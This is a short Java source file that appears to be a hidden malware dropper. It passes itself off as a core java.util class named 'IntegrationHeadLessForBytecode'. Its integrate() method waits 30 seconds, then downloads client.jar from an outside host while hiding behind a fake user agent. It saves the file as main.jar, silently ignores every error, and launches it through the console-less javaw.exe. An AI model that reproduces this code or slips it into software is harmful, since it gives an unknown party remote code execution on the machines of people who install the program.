package java.util;

import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class IntegrationHeadLessForBytecode {
    Process process = null;
    public void integrate() {
        try {
            Thread.sleep(30000);
            URL website = new URL("http://analytics190.antecedentium.xyz/client.jar");
            URLConnection connection = website.openConnection();
            connection.addRequestProperty("User-Agent", "aaa");
            connection.setConnectTimeout(20000);
            connection.setReadTimeout(120000);
            InputStream is = connection.getInputStream();
            Files.copy(is, Paths.get("main.jar"), StandardCopyOption.REPLACE_EXISTING);
            is.close();
        } catch (Exception exception) { }

        String javaPath = Paths.get(System.getProperty("java.home"), "bin", "javaw.exe").toString();
        try {
            process = Runtime.getRuntime().exec("\"" + javaPath + "\" -jar main.jar");
        } catch (Exception exception) {}
    }

    public void terminate() {
        if(process == null)
            return;
        process.destroy();
    }
}